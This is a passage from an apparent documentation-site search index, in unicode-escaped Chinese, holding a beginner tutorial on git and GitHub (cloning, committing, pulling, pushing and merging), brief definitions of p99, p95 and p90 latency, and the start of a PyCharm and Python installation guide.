\u63d0\u4f9b\u5546\uff0c\u7ed9\u7528\u6237\u514d\u8d39\u6258\u7ba1\u4ee3\u7801\u3002GitHub\u540c\u65f6\u63d0\u4f9b\u4ed8\u8d39\u8d26\u6237\u548c\u514d\u8d39\u8d26\u6237\u3002\u8fd9\u4e24\u79cd\u8d26\u6237\u90fd\u53ef\u4ee5\u521b\u5efa\u516c\u5f00\u6216\u79c1\u6709\u7684 \u4ee3\u7801\u4ed3\u5e93 \uff0c\u4f46\u4ed8\u8d39\u7528\u6237\u62e5\u6709\u66f4\u591a\u529f\u80fd\u3002 \u521b\u5efa\u8d26\u6237 \u8bbf\u95eehttps://github.com \uff0c\u53f3\u4e0a\u89d2\u9009\u62e9 Sign up \uff0c\u7136\u540e\u6ce8\u518c\u3002 Sign in \u4e3a\u767b\u5f55 github\u4e0a\u521b\u5efa\u4e00\u4e2a\u516c\u5f00\u7684\u5e93 github\u4e0a\u521b\u5efa\u4e00\u4e2a\u516c\u5f00\u7684\u5e93\uff08\u5efa\u7acb\u81ea\u5df1\u7684git\u4e2d\u592e\u670d\u52a1\u5668\uff09 \u767b\u5f55\u4e4b\u540e\uff0c\u5728\u9875\u9762\u53f3\u4e0a\u89d2\u70b9\u51fb \uff0b \u53f7\uff0c\u9009\u62e9 New repository \u5982\u4e0b\u56fe \u7136\u540e\u586b\u5199repository\u7684\u540d\u5b57\uff0c\u63cf\u8ff0\uff0c\u9009\u62e9\u662f\u5426\u4e3a\u516c\u5f00\uff08\u516c\u5f00\u4e3a\u5176\u4ed6\u4eba\u4e5f\u80fd\u770b\u5230\uff0c\u79c1\u6709\u662f\u53ea\u80fd\u81ea\u5df1\u770b\u5230\uff09\uff0c\u9009\u62e9 Add a README file \uff08\u6dfb\u52a0\u5e93\u7684\u63cf\u8ff0\u6587\u4ef6\uff09\uff0c\u70b9\u51fb Create repository \u901a\u8fc7git\u4f7f\u7528github \u8bb2\u89e3\u4e0b\uff0c\u5982\u4f55\u901a\u8fc7git\u540c\u6b65\u4e2d\u592e\u670d\u52a1\u5668\u5230\u672c\u5730\u6570\u636e\u5e93\uff0c\u4ece\u672c\u5730\u6570\u636e\u5e93\u5982\u4f55\u63a8\u9001\u5230\u4e2d\u592e\u670d\u52a1\u5668\u3002\u5982\u4f55\u5408\u5e76\u6587\u4ef6\u53d8\u5316 \u4ecegithub\u4e0a\u514b\u9686repository\u5230\u672c\u5730 \u5728github\u4e0a\u521b\u5efarepository\u4e4b\u540e\uff0c\u628a\u5b83\u540c\u6b65\u5230\u672c\u5730\u7535\u8111\u4e0a\uff0c\u9996\u5148\u5728repository\u590d\u5236repository\u7684\u5730\u5740\uff0c\u5982\u4e0b\u56fe \u7136\u540e\u5728\u81ea\u5df1\u7684\u7535\u8111\u4e0a\u9009\u62e9\u4e00\u4e2a\u76ee\u5f55\uff0c\u7136\u540e\u53f3\u952e Git Bash Here \uff0c\u547d\u4ee4\u884c\u5c31\u4ece\u6b64\u76ee\u5f55\u6253\u5f00\u4e86\uff0c\u7136\u540e\u8f93\u5165git\u547d\u4ee4\uff0c\u5982\u4e0b\u56fe\uff0c\u51fa\u73b0done\u540e\uff0c\u5c31\u628arepository \u514b\u9686 \u5230\u672c\u5730learn\u76ee\u5f55\u4e0b\u4e86 git clone https://github.com/yinzhipeng123/learn.git \u76ee\u5f55\u5185\u5c31\u4e00\u4e2aREADME.md\u6587\u4ef6\uff08\u5e93\u7684\u63cf\u8ff0\u6587\u4ef6\uff09\uff0c .git \u4e3a\u8be5repository\u7684git\u4fe1\u606f\u6587\u4ef6\uff0c\u4e0d\u80fd\u5220\u9664\uff0c\u5b83\u4fdd\u7559\u7740\u8be5repository\u662f\u4ece\u54ea\u91cc\u514b\u9686\u5230\u8fd9\u91cc\u7684\uff0c\u6587\u4ef6\u53d8\u5316\uff0cgithub\u8d26\u53f7\u4fe1\u606f\u7b49\u7b49 \u672c\u5730\u6dfb\u52a0\u6587\u4ef6\u5e76\u63a8\u9001\u5230github\u4e0a \u5728repository\u76ee\u5f55\u4e2d\uff0c\u6dfb\u52a0\u4e2alearn.txt\u6587\u4ef6\uff0c\u968f\u4fbf\u5199\u70b9\u4ec0\u4e48\uff0c\u7136\u540e\u901a\u8fc7\u547d\u4ee4\u884c\uff0c\u8fdb\u5165repository\u76ee\u5f55\uff0c\u63d0\u4ea4\u4fe1\u606f\u5e76\u63a8\u9001\u5230github\u4e0a cd learn #\u8fdb\u5165repository\u76ee\u5f55\u4e2d ls #\u67e5\u770b\u6587\u4ef6 git add -A ./ #\u6dfb\u52a0\u6240\u6709\u6587\u4ef6\u53ca\u53d8\u5316\u5230\u6682\u5b58\uff0c\u6b64\u547d\u4ee4\u53ef\u4ee5\u6267\u884c\u591a\u6b21\uff0c\u6bd4\u5982\u4fee\u6539\u6587\u4ef6\u540e\uff0c\u6dfb\u52a0\u5230\u6682\u5b58\u4e86\uff0c\u540e\u6765\u53c8\u4fee\u6539\u6587\u4ef6\uff0c\u53ef\u4ee5\u518d\u6dfb\u52a0\u4e00\u904d\u6682\u5b58\uff0c\u786e\u4fdd\u5728commit\u4e4b\u524d\uff0c\u628a\u6700\u65b0\u6587\u4ef6\u90fd\u6dfb\u52a0\u5230\u6682\u5b58\u5c31\u884c git commit -m '\u65b0\u5efalearn.txt' #\u63d0\u4ea4\u6682\u5b58\u5230\u672c\u5730\u6570\u636e\u5e93\u4e2d\uff0c-m\u4e4b\u540e\u7684\u540d\u5b57\u53ef\u4ee5\u968f\u4fbf\u5199 git push #\u63a8\u9001\u672c\u5730\u6570\u636e\u5e93\u5230github\u4e0a\uff0c\u5728\u6b64\u6b65\u9aa4\u4e2d\u53ef\u80fd\u4f1a\u5f39\u51fa\u5bf9\u8bdd\u6846\u6216\u8005\u7f51\u9875\uff0c\u8ba9\u586b\u5165github\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u6309\u7167\u63d0\u793a\u586b\u5199\u5c31\u884c\u4e86\uff0c\u5982\u679c\u586b\u9519\u4e86\uff0c\u91cd\u65b0\u6267\u884c\u8be5\u547d\u4ee4\u5c31\u53ef\u4ee5 \u7136\u540e\u67e5\u770bgithub\uff0c\u663e\u793a\u4e86\u521a\u521a\u63a8\u9001\u7684\u6587\u4ef6\u53cacommit\u4fe1\u606f \u4ecegithub\u4e0a\u62c9\u53d6\u6700\u65b0\u4ee3\u7801 \u5728github\u4e0a\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff0c\u65b0\u5efa\u4e00\u4e2agithub_add.txt \u70b9\u51fb commit new file \uff0c\u5b8c\u6210\u521b\u5efa \u5982\u4e0b\u56fe\uff0c\u663e\u793a\u521b\u5efa\u5b8c\u6210 \u672c\u5730\u62c9\u53d6\u6700\u65b0\u7684\u6587\u4ef6 ls #\u56fe\u4e0a\u663e\u793a\u6ca1\u6709github_add.txt git pull #\u663e\u793a\u4e00\u4e2a\u6587\u4ef6\u53d8\u5316 ls \u56fe\u4e0a\u663e\u793a\u6709github_add.txt\u4e86 github\u63d0\u4ea4\u7684\u5e38\u89c4\u64cd\u4f5c \u5982\u679c\u6211\u4eec\u5728\u591a\u7aef\u64cd\u4f5c\uff0c\u5047\u5982\u4f60\u6709\u4e24\u4e2a\u7535\u8111\uff0c\u7535\u8111A\uff0c\u7535\u8111B\uff0c\u4f60\u5728\u7535\u8111A\u548c\u7535\u8111B\u540c\u4e00\u65f6\u95f4\u514b\u9686\u7684github\u4e0a\u76f8\u540c\u7684\u7684repository\uff0c\u6b64\u65f6\u7535\u8111A\u548c\u7535\u8111B\u6587\u4ef6\u662f\u4e00\u6837\u7684\u3002\u7535\u8111A\u52a0\u4e86\u4e9b\u65b0\u7684\u6587\u4ef6\u5e76\u63d0\u4ea4\u4e86\u5230\u4e86github\u4e0a\uff0c\u6b64\u65f6\u4f60\u7528\u7535\u8111B\uff0c\u7535\u8111B\u4e0a\u4f60\u4e5f\u52a0\u4e86\u65b0\u7684\u6587\u4ef6\uff0c\u4f60\u60f3\u628a\u7535\u8111B\u4e5f\u63d0\u4ea4\u5230github\u4e0a\uff0c\u4f46\u662f\u76f4\u63a5 git push \u662f\u4e0d\u884c\u7684\uff0c\u4f60\u9700\u8981\u5148 commit \u540e\u518d git pull \uff0c\u628a\u672c\u5730\u548cgithub\u4e0a\u6700\u65b0\u7684\u6587\u4ef6\u5728\u672c\u5730\u8fdb\u884c\u5408\u5e76\uff0c\u7136\u540e\u518d push \u5c31\u53ef\u4ee5\u4e86 \u6240\u4ee5\u4e00\u822c\u7684git\u5e38\u89c4\u64cd\u4f5c\u4e3a git add ./ -A #\u6682\u5b58\u6240\u6709\u6587\u4ef6\u53ca\u53d8\u5316 git commit -m '\u8fd9\u6b21\u63d0\u4ea4\u7684\u540d\u5b57' #\u63d0\u4ea4\u6682\u5b58\u5230\u672c\u5730git\u6570\u636e\u5e93\u4e2d git pull #\u62c9\u53d6\u6700\u65b0\u7684\u4ee3\u7801\uff0c\u5e76\u8fdb\u884c\u5408\u5e76 git push #\u63a8\u9001\u4ee3\u7801\u5230github\u4e0a \u6a21\u62df\uff1a \u5728github\u4e0a\u6dfb\u52a0\u65b0\u7684\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff0c\u6dfb\u52a0web.txt \u672c\u5730\u6dfb\u52a0desktop.txt\u6587\u4ef6 \uff08echo \"\u7535\u8111\u7aef\" > desktop.txt\u4e3a\u65b0\u5efa\u6587\u4ef6\u5e76\u5199\u5165\"\u7535\u8111\u7aef\"\u4e09\u4e2a\u5b57\uff09 ls echo \"\u7535\u8111\u7aef\" > desktop.txt \u7136\u540e\u672c\u5730\u63d0\u4ea4\u6587\u4ef6\u5230\u672c\u5730\u6570\u636e\u5e93\uff0c\u5e76\u62c9\u53d6github\u6700\u65b0\u6570\u636e\u8fdb\u884c\u5408\u5e76 git add -A ./ git commit -m '\u6dfb\u52a0desktop.txt' git pull \u8f93\u5165 git pull \u540e\uff0c\u56de\u8f66\u4f1a\u5f39\u51fa\u4e2a\u9875\u9762\uff0c\u63d0\u793a\u4f60\u5408\u5e76\u6587\u4ef6\uff0c\u8f93\u5165 :wq \u4fdd\u5b58\u5373\u53ef\uff0c\u6b64\u4e3a\u5408\u5e76\u6210\u529f \u7136\u540e\u63a8\u9001\u5230github\u4e0a\u5c31\u53ef\u4ee5\u4e86\uff0c\u63d0\u793a\u63a8\u9001\u6210\u529f \u67e5\u770bgithub\u4e0a\uff0c\u5df2\u7ecf\u663e\u793a\u4e86\u6240\u6709\u7684\u6587\u4ef6\u4e86","title":"git\u53cagithub\u7684\u8f7b\u5ea6\u6559\u7a0b"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#gitgithub","text":"","title":"git\u53cagithub\u7684\u4f7f\u7528"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#git","text":"","title":"git"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#_1","text":"git - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) git \u662f\u4e00\u4e2a \u5206\u5e03\u5f0f \u4ee3\u7801\u7ba1\u7406\u5de5\u5177\uff0c git \u5728\u672c\u5730\u4f1a\u6709\u5efa\u7acb\u4e2a\u6570\u636e\u5e93\uff0c\u5f53\u6211\u4eec\u4fee\u6539\u5b8c\u4ee3\u7801\u540e\uff0c git \u4f1a\u4fdd\u5b58\u76f8\u5e94\u7684\u53d8\u5316\u5230\u6570\u636e\u5e93\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u628a\u53d8\u5316\u53ca\u6587\u4ef6\u4fdd\u5b58\u5230 \u4e2d\u592e\u670d\u52a1\u5668 \uff0c\u5f53\u67e5\u770b\u522b\u4eba\u4fee\u6539\u7684\u8bb0\u5f55\u65f6\uff0c\u53c8\u53ef\u4ee5\u4ece\u4e2d\u592e\u670d\u52a1\u5668\u62c9\u53d6\u6570\u636e\u5230\u672c\u5730\u6570\u636e\u5e93\uff0c\u4ece\u672c\u5730\u67e5\u770b\u522b\u4eba\u7684\u4fee\u6539\u8fc7\u7684\u5185\u5bb9\u53ca\u6700\u65b0\u7684\u6587\u4ef6","title":"\u57fa\u672c\u6982\u5ff5\uff1a"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#git_1","text":"\u4ece\u4e2d\u592e\u670d\u52a1\u5668\u62c9\u53d6\u5e76\u521b\u5efa\u672c\u5730\u6570\u636e\u5e93 git clone https://xxx.com/xxx/xxx.git \u6682\u5b58\u6240\u6709\u6587\u4ef6\u53ca\u53d8\u5316 git add ./ -A \u63d0\u4ea4\u6682\u5b58\u5230\u672c\u5730git\u6570\u636e\u5e93\u4e2d git commit -m '\u8fd9\u6b21\u63d0\u4ea4\u7684\u540d\u5b57' \u63a8\u9001\u672c\u5730\u6570\u636e\u5e93\u5230\u4e2d\u592e\u670d\u52a1\u5668 git push \u62c9\u53d6\u4e2d\u592e\u670d\u52a1\u5668\u7684\u4ee3\u7801\u5230\u672c\u5730\u6570\u636e\u5e93\u4e2d git pull","title":"\u4e2a\u4eba\u4f7f\u7528git\u9700\u8981\u638c\u63e1\u7684\u4e00\u4e9b\u547d\u4ee4"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#_2","text":"","title":"\u5b89\u88c5"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#windows10","text":"Git - Downloads (git-scm.com) \u6b64\u5730\u5740\u4e3aGIT\u5b98\u7f51\u4e0b\u8f7d\u5730\u5740\uff0c\u9009\u62e9Windows\uff0c\u9009\u62e964-bit Git for Windows Setup\uff0c\u7136\u540e\u4e0b\u8f7d\u5b89\u88c5\uff0c\u9009\u62e9\u5b89\u88c5\u4f4d\u7f6e\uff0c\u6839\u636e\u81ea\u5df1\u9700\u6c42\u9009\u62e9\uff0c\u5176\u4e2d\u6709\u4e00\u9879\u5b89\u88c5\u9009\u9879\uff0c\u5982\u4e0b\u56fe\u9009\u62e9\uff0c\u7ed9Windows\u53f3\u952e\u6dfb\u52a0\u5feb\u901f\u8fdb\u5165git\u7684\u5feb\u6377\u65b9\u5f0f\uff08Git Bash Here\u3001Git GUI Here\uff09\u3001\u6dfb\u52a0git\u73af\u5883\u914d\u7f6e\u6587\u4ef6\u5728CMD\u4e2d\uff08\u56fe\u4e2d\u6700\u540e\u4e00\u9879\uff09\uff0c\u52fe\u9009\u8fd9\u51e0\u9879\u4f1a\u7ed9\u4f7f\u7528\u6dfb\u52a0\u5f88\u591a\u4fbf\u5229 \u5b89\u88c5\u5b8c\u4e4b\u540e\u7684\u6837\u5b50\uff0c\u5982\u4e0b\u56fe\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u76ee\u5f55\u4e0b\uff0c\u5feb\u901f\u8fdb\u5165git","title":"Windows10\u4e0a\u5b89\u88c5"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#github","text":"GitHub - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) github\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e16\u754c\u4e0a\u6700\u5927\u7684 git\u4e2d\u592e\u670d\u52a1\u5668 \u63d0\u4f9b\u5546\uff0c\u7ed9\u7528\u6237\u514d\u8d39\u6258\u7ba1\u4ee3\u7801\u3002GitHub\u540c\u65f6\u63d0\u4f9b\u4ed8\u8d39\u8d26\u6237\u548c\u514d\u8d39\u8d26\u6237\u3002\u8fd9\u4e24\u79cd\u8d26\u6237\u90fd\u53ef\u4ee5\u521b\u5efa\u516c\u5f00\u6216\u79c1\u6709\u7684 \u4ee3\u7801\u4ed3\u5e93 \uff0c\u4f46\u4ed8\u8d39\u7528\u6237\u62e5\u6709\u66f4\u591a\u529f\u80fd\u3002","title":"github\u7684\u4f7f\u7528"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#_3","text":"\u8bbf\u95eehttps://github.com \uff0c\u53f3\u4e0a\u89d2\u9009\u62e9 Sign up \uff0c\u7136\u540e\u6ce8\u518c\u3002 Sign in \u4e3a\u767b\u5f55","title":"\u521b\u5efa\u8d26\u6237"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#github_1","text":"github\u4e0a\u521b\u5efa\u4e00\u4e2a\u516c\u5f00\u7684\u5e93\uff08\u5efa\u7acb\u81ea\u5df1\u7684git\u4e2d\u592e\u670d\u52a1\u5668\uff09 \u767b\u5f55\u4e4b\u540e\uff0c\u5728\u9875\u9762\u53f3\u4e0a\u89d2\u70b9\u51fb \uff0b \u53f7\uff0c\u9009\u62e9 New repository \u5982\u4e0b\u56fe \u7136\u540e\u586b\u5199repository\u7684\u540d\u5b57\uff0c\u63cf\u8ff0\uff0c\u9009\u62e9\u662f\u5426\u4e3a\u516c\u5f00\uff08\u516c\u5f00\u4e3a\u5176\u4ed6\u4eba\u4e5f\u80fd\u770b\u5230\uff0c\u79c1\u6709\u662f\u53ea\u80fd\u81ea\u5df1\u770b\u5230\uff09\uff0c\u9009\u62e9 Add a README file \uff08\u6dfb\u52a0\u5e93\u7684\u63cf\u8ff0\u6587\u4ef6\uff09\uff0c\u70b9\u51fb Create repository","title":"github\u4e0a\u521b\u5efa\u4e00\u4e2a\u516c\u5f00\u7684\u5e93"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#gitgithub_1","text":"\u8bb2\u89e3\u4e0b\uff0c\u5982\u4f55\u901a\u8fc7git\u540c\u6b65\u4e2d\u592e\u670d\u52a1\u5668\u5230\u672c\u5730\u6570\u636e\u5e93\uff0c\u4ece\u672c\u5730\u6570\u636e\u5e93\u5982\u4f55\u63a8\u9001\u5230\u4e2d\u592e\u670d\u52a1\u5668\u3002\u5982\u4f55\u5408\u5e76\u6587\u4ef6\u53d8\u5316","title":"\u901a\u8fc7git\u4f7f\u7528github"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#githubrepository","text":"\u5728github\u4e0a\u521b\u5efarepository\u4e4b\u540e\uff0c\u628a\u5b83\u540c\u6b65\u5230\u672c\u5730\u7535\u8111\u4e0a\uff0c\u9996\u5148\u5728repository\u590d\u5236repository\u7684\u5730\u5740\uff0c\u5982\u4e0b\u56fe \u7136\u540e\u5728\u81ea\u5df1\u7684\u7535\u8111\u4e0a\u9009\u62e9\u4e00\u4e2a\u76ee\u5f55\uff0c\u7136\u540e\u53f3\u952e Git Bash Here \uff0c\u547d\u4ee4\u884c\u5c31\u4ece\u6b64\u76ee\u5f55\u6253\u5f00\u4e86\uff0c\u7136\u540e\u8f93\u5165git\u547d\u4ee4\uff0c\u5982\u4e0b\u56fe\uff0c\u51fa\u73b0done\u540e\uff0c\u5c31\u628arepository \u514b\u9686 \u5230\u672c\u5730learn\u76ee\u5f55\u4e0b\u4e86 git clone https://github.com/yinzhipeng123/learn.git \u76ee\u5f55\u5185\u5c31\u4e00\u4e2aREADME.md\u6587\u4ef6\uff08\u5e93\u7684\u63cf\u8ff0\u6587\u4ef6\uff09\uff0c .git \u4e3a\u8be5repository\u7684git\u4fe1\u606f\u6587\u4ef6\uff0c\u4e0d\u80fd\u5220\u9664\uff0c\u5b83\u4fdd\u7559\u7740\u8be5repository\u662f\u4ece\u54ea\u91cc\u514b\u9686\u5230\u8fd9\u91cc\u7684\uff0c\u6587\u4ef6\u53d8\u5316\uff0cgithub\u8d26\u53f7\u4fe1\u606f\u7b49\u7b49","title":"\u4ecegithub\u4e0a\u514b\u9686repository\u5230\u672c\u5730"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#github_2","text":"\u5728repository\u76ee\u5f55\u4e2d\uff0c\u6dfb\u52a0\u4e2alearn.txt\u6587\u4ef6\uff0c\u968f\u4fbf\u5199\u70b9\u4ec0\u4e48\uff0c\u7136\u540e\u901a\u8fc7\u547d\u4ee4\u884c\uff0c\u8fdb\u5165repository\u76ee\u5f55\uff0c\u63d0\u4ea4\u4fe1\u606f\u5e76\u63a8\u9001\u5230github\u4e0a cd learn #\u8fdb\u5165repository\u76ee\u5f55\u4e2d ls #\u67e5\u770b\u6587\u4ef6 git add -A ./ #\u6dfb\u52a0\u6240\u6709\u6587\u4ef6\u53ca\u53d8\u5316\u5230\u6682\u5b58\uff0c\u6b64\u547d\u4ee4\u53ef\u4ee5\u6267\u884c\u591a\u6b21\uff0c\u6bd4\u5982\u4fee\u6539\u6587\u4ef6\u540e\uff0c\u6dfb\u52a0\u5230\u6682\u5b58\u4e86\uff0c\u540e\u6765\u53c8\u4fee\u6539\u6587\u4ef6\uff0c\u53ef\u4ee5\u518d\u6dfb\u52a0\u4e00\u904d\u6682\u5b58\uff0c\u786e\u4fdd\u5728commit\u4e4b\u524d\uff0c\u628a\u6700\u65b0\u6587\u4ef6\u90fd\u6dfb\u52a0\u5230\u6682\u5b58\u5c31\u884c git commit -m '\u65b0\u5efalearn.txt' #\u63d0\u4ea4\u6682\u5b58\u5230\u672c\u5730\u6570\u636e\u5e93\u4e2d\uff0c-m\u4e4b\u540e\u7684\u540d\u5b57\u53ef\u4ee5\u968f\u4fbf\u5199 git push #\u63a8\u9001\u672c\u5730\u6570\u636e\u5e93\u5230github\u4e0a\uff0c\u5728\u6b64\u6b65\u9aa4\u4e2d\u53ef\u80fd\u4f1a\u5f39\u51fa\u5bf9\u8bdd\u6846\u6216\u8005\u7f51\u9875\uff0c\u8ba9\u586b\u5165github\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u6309\u7167\u63d0\u793a\u586b\u5199\u5c31\u884c\u4e86\uff0c\u5982\u679c\u586b\u9519\u4e86\uff0c\u91cd\u65b0\u6267\u884c\u8be5\u547d\u4ee4\u5c31\u53ef\u4ee5 \u7136\u540e\u67e5\u770bgithub\uff0c\u663e\u793a\u4e86\u521a\u521a\u63a8\u9001\u7684\u6587\u4ef6\u53cacommit\u4fe1\u606f","title":"\u672c\u5730\u6dfb\u52a0\u6587\u4ef6\u5e76\u63a8\u9001\u5230github\u4e0a"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#github_3","text":"\u5728github\u4e0a\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff0c\u65b0\u5efa\u4e00\u4e2agithub_add.txt \u70b9\u51fb commit new file \uff0c\u5b8c\u6210\u521b\u5efa \u5982\u4e0b\u56fe\uff0c\u663e\u793a\u521b\u5efa\u5b8c\u6210 \u672c\u5730\u62c9\u53d6\u6700\u65b0\u7684\u6587\u4ef6 ls #\u56fe\u4e0a\u663e\u793a\u6ca1\u6709github_add.txt git pull #\u663e\u793a\u4e00\u4e2a\u6587\u4ef6\u53d8\u5316 ls \u56fe\u4e0a\u663e\u793a\u6709github_add.txt\u4e86","title":"\u4ecegithub\u4e0a\u62c9\u53d6\u6700\u65b0\u4ee3\u7801"},{"location":"tool/github%E4%BD%BF%E7%94%A8/#github_4","text":"\u5982\u679c\u6211\u4eec\u5728\u591a\u7aef\u64cd\u4f5c\uff0c\u5047\u5982\u4f60\u6709\u4e24\u4e2a\u7535\u8111\uff0c\u7535\u8111A\uff0c\u7535\u8111B\uff0c\u4f60\u5728\u7535\u8111A\u548c\u7535\u8111B\u540c\u4e00\u65f6\u95f4\u514b\u9686\u7684github\u4e0a\u76f8\u540c\u7684\u7684repository\uff0c\u6b64\u65f6\u7535\u8111A\u548c\u7535\u8111B\u6587\u4ef6\u662f\u4e00\u6837\u7684\u3002\u7535\u8111A\u52a0\u4e86\u4e9b\u65b0\u7684\u6587\u4ef6\u5e76\u63d0\u4ea4\u4e86\u5230\u4e86github\u4e0a\uff0c\u6b64\u65f6\u4f60\u7528\u7535\u8111B\uff0c\u7535\u8111B\u4e0a\u4f60\u4e5f\u52a0\u4e86\u65b0\u7684\u6587\u4ef6\uff0c\u4f60\u60f3\u628a\u7535\u8111B\u4e5f\u63d0\u4ea4\u5230github\u4e0a\uff0c\u4f46\u662f\u76f4\u63a5 git push \u662f\u4e0d\u884c\u7684\uff0c\u4f60\u9700\u8981\u5148 commit \u540e\u518d git pull \uff0c\u628a\u672c\u5730\u548cgithub\u4e0a\u6700\u65b0\u7684\u6587\u4ef6\u5728\u672c\u5730\u8fdb\u884c\u5408\u5e76\uff0c\u7136\u540e\u518d push \u5c31\u53ef\u4ee5\u4e86 \u6240\u4ee5\u4e00\u822c\u7684git\u5e38\u89c4\u64cd\u4f5c\u4e3a git add ./ -A #\u6682\u5b58\u6240\u6709\u6587\u4ef6\u53ca\u53d8\u5316 git commit -m '\u8fd9\u6b21\u63d0\u4ea4\u7684\u540d\u5b57' #\u63d0\u4ea4\u6682\u5b58\u5230\u672c\u5730git\u6570\u636e\u5e93\u4e2d git pull #\u62c9\u53d6\u6700\u65b0\u7684\u4ee3\u7801\uff0c\u5e76\u8fdb\u884c\u5408\u5e76 git push #\u63a8\u9001\u4ee3\u7801\u5230github\u4e0a \u6a21\u62df\uff1a \u5728github\u4e0a\u6dfb\u52a0\u65b0\u7684\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff0c\u6dfb\u52a0web.txt \u672c\u5730\u6dfb\u52a0desktop.txt\u6587\u4ef6 \uff08echo \"\u7535\u8111\u7aef\" > desktop.txt\u4e3a\u65b0\u5efa\u6587\u4ef6\u5e76\u5199\u5165\"\u7535\u8111\u7aef\"\u4e09\u4e2a\u5b57\uff09 ls echo \"\u7535\u8111\u7aef\" > desktop.txt \u7136\u540e\u672c\u5730\u63d0\u4ea4\u6587\u4ef6\u5230\u672c\u5730\u6570\u636e\u5e93\uff0c\u5e76\u62c9\u53d6github\u6700\u65b0\u6570\u636e\u8fdb\u884c\u5408\u5e76 git add -A ./ git commit -m '\u6dfb\u52a0desktop.txt' git pull \u8f93\u5165 git pull \u540e\uff0c\u56de\u8f66\u4f1a\u5f39\u51fa\u4e2a\u9875\u9762\uff0c\u63d0\u793a\u4f60\u5408\u5e76\u6587\u4ef6\uff0c\u8f93\u5165 :wq \u4fdd\u5b58\u5373\u53ef\uff0c\u6b64\u4e3a\u5408\u5e76\u6210\u529f \u7136\u540e\u63a8\u9001\u5230github\u4e0a\u5c31\u53ef\u4ee5\u4e86\uff0c\u63d0\u793a\u63a8\u9001\u6210\u529f \u67e5\u770bgithub\u4e0a\uff0c\u5df2\u7ecf\u663e\u793a\u4e86\u6240\u6709\u7684\u6587\u4ef6\u4e86","title":"github\u63d0\u4ea4\u7684\u5e38\u89c4\u64cd\u4f5c"},{"location":"tool/p99/","text":"P99 p99 1.403 \u8868\u793a\u8fc7\u53bb\u768410\u79d2\u5185\u6700\u6162\u76841%\u8bf7\u6c42\u7684\u5e73\u5747\u5ef6\u65f6\u4e3a1.403\u79d2 p95 1.403 \u8868\u793a\u8fc7\u53bb\u768410\u79d2\u5185\u6700\u6162\u76845%\u8bf7\u6c42\u7684\u5e73\u5747\u5ef6\u65f6\u4e3a1.403\u79d2 p90 1.403 \u8868\u793a\u8fc7\u53bb\u768410\u79d2\u5185\u6700\u6162\u768410%\u8bf7\u6c42\u7684\u5e73\u5747\u5ef6\u65f6\u4e3a1.403\u79d2","title":"P99"},{"location":"tool/p99/#p99","text":"","title":"P99"},{"location":"tool/p99/#p99-1403","text":"\u8868\u793a\u8fc7\u53bb\u768410\u79d2\u5185\u6700\u6162\u76841%\u8bf7\u6c42\u7684\u5e73\u5747\u5ef6\u65f6\u4e3a1.403\u79d2","title":"p99 1.403"},{"location":"tool/p99/#p95-1403","text":"\u8868\u793a\u8fc7\u53bb\u768410\u79d2\u5185\u6700\u6162\u76845%\u8bf7\u6c42\u7684\u5e73\u5747\u5ef6\u65f6\u4e3a1.403\u79d2","title":"p95 1.403"},{"location":"tool/p99/#p90-1403","text":"\u8868\u793a\u8fc7\u53bb\u768410\u79d2\u5185\u6700\u6162\u768410%\u8bf7\u6c42\u7684\u5e73\u5747\u5ef6\u65f6\u4e3a1.403\u79d2","title":"p90 1.403"},{"location":"tool/pycharm/","text":"Pycharm\u53ca\u914d\u5408Github\u7684\u4f7f\u7528 Git\u7684\u5b89\u88c5 \u53c2\u8003\u4e0b\u9762\u7684\u6587\u7ae0\uff0c \u5b89\u88c5 \u7ae0\u8282 git\u53cagithub\u7684\u8f7b\u5ea6\u6559\u7a0b - MarkDown_Log (yinzhipeng123.github.io) Python\u7684\u5b89\u88c5 Windows10\u4e0b https://www.python.org/downloads/windows/ \u4e0b\u8f7d\u5730\u5740\uff0c\u4e2d\u9009\u62e93.9.7\uff0c64\u5b89\u88c5\u5305\uff0c\u4e0b\u56fe\u4e2d\u6700\u4e0b\u9762\u7684\u4e00\u4e2a \u5b89\u88c5\u8fc7\u7a0b\u5f88\u7b80\u5355\uff0c\u57fa\u672c\u90fd\u662f\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\uff0c\u5176\u4e2d\u6709\u4e9b\u914d\u7f6e\u8981\u5982\u4e0b\u56fe\uff0c\uff08Add Python 3.9 to Path\uff09\u6dfb\u52a0Python\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\uff08Install lanuncher for all user\uff09\u5b89\u88c5\u4e3a\u7535\u8111\u4e2d\u6240\u6709\u7528\u6237 \u4e0b\u56fe\uff0c\u5168\u90e8\u52fe\u9009 \u4e0b\u56fe\uff0c\u5982\u56fe\u52fe\u9009\uff0c\u5b89\u88c5\u8def\u5f84\u6309\u7167\u81ea\u5df1\u9700\u6c42 \u4e0b\u56fe\uff0c\u70b9\u51fbDisable path length limit 